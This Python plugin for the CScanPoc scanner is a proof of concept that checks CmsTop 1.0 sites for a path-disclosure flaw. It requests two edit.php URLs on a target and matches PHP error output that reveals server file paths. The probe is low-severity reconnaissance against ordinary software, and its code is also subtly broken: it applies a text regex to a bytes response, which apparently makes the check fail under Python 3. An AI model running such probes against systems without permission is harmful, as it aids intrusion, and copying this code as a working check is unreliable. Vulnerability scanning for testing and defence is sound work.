# coding: utf-8
import re
import urllib.request
import urllib.error
import urllib.parse

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'CmsTop_0101'  # 平台漏洞编号，留空
    name = 'CmsTop 1.0 /apps/system/view/template/edit.php Path Disclosure'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2014-11-01'  # 漏洞公布时间
    desc = '''
    CmsTop 1.0 /apps/system/view/template/edit.php Path Disclosure.
    '''  # 漏洞描述
    ref = 'https://www.yascanner.com/#!/n/56'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'CmsTop'  # 漏洞应用名称
    product_version = '1.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'e80857aa-0746-446c-9a3e-c64c36675320'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            file_list = ['/cmstop/apps/system/view/template/edit.php',
                         '/apps/system/view/template/edit.php', ]
            for filename in file_list:
                verify_url = self.target + filename
                try:
                    req = urllib.request.urlopen(verify_url)
                    content = req.read()
                except:
                    continue
                m = re.search(
                    ' in <b>([^<]+)</b> on line <b>(\\d+)</b>', content)
                if m:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
